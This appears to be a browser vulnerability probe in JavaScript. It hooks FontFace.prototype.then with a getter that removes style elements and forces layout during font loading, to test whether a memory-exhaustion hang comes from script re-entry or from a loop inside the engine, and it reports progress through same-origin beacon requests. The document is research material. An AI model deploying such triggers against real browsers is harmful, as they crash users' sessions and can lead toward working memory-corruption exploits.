/*
 * p449: is the font-face failure a re-entry loop we can stop?
 *
 * p448 reached M2-getter and never returned from `faceA.load()`. The getter in
 * that probe removed a real style element, forced layout, and stopped
 * removing after 2000 entries - and the process still died of memory
 * exhaustion before `load()` returned, so either 2000 nested cycles is already
 * more than the process can carry, or the engine loops without calling us.
 *
 * This probe caps the getter at 4 entries, and runs the removal without an
 * explicit layout first:
 *
 *   B  getter removes the element, no layout                  -> B-DONE or hang
 *   A  getter removes the element and forces layout           -> A-DONE or hang
 *
 * If a trigger returns with `fired=4`, the loop is re-entry through our getter
 * and the engine simply has no guard; if it hangs with the cap in place, the
 * loop is inside the engine and our counter never runs again.
 */
(function () {
    var s = 'ff';
    try {
        s = sessionStorage.getItem('v172s') || Math.random().toString(36).slice(2, 8);
        sessionStorage.setItem('v172s', s);
    } catch (e) {}

    function mark(tag) {
        var url = location.origin + '/beacon/V172-' + s + '-' + tag + '?t=' + Date.now();
        try {
            var x = new XMLHttpRequest();
            x.open('GET', url, false);
            x.send();
        } catch (e) {
            try { navigator.sendBeacon(url); } catch (e2) {}
        }
    }

    mark('BOOT');
    if (typeof FontFace === 'undefined' || !document.fonts) { mark('API-no'); return; }

    function setup(styleId) {
        var dummy = document.createElement('style');
        dummy.id = 'd-' + styleId;
        dummy.textContent = 'x{}';
        document.head.appendChild(dummy);
        var st = document.createElement('style');
        st.id = styleId;
        st.textContent = '@font-face { font-family: ' + styleId + '; src: local(Helvetica); }';
        document.head.appendChild(st);
        document.body.offsetHeight;
        var face = null;
        document.fonts.forEach(function (f) {
            if (f.family && f.family.replace(/['"]/g, '') === styleId) face = f;
        });
        return face;
    }

    function trigger(styleId, forceLayout, cap) {
        var face = setup(styleId);
        if (!face) { mark(styleId + '-missing'); return; }
        var loaded = face.loaded;
        var fired = 0;
        Object.defineProperty(FontFace.prototype, 'then', {
            get: function () {
                fired++;
                if (fired > cap) return undefined;
                var t = document.getElementById('d-' + styleId);
                if (t) t.remove();
                if (forceLayout) document.body.offsetHeight;
                return undefined;
            },
            configurable: true
        });
        face.load();
        mark(styleId + '-returned-fired=' + fired);
        delete FontFace.prototype.then;
    }

    trigger('ffB', false, 4);
    mark('B-block-done');
    trigger('ffA', true, 4);
    mark('A-block-done');
    setTimeout(function () { mark('DONE'); }, 800);
})();
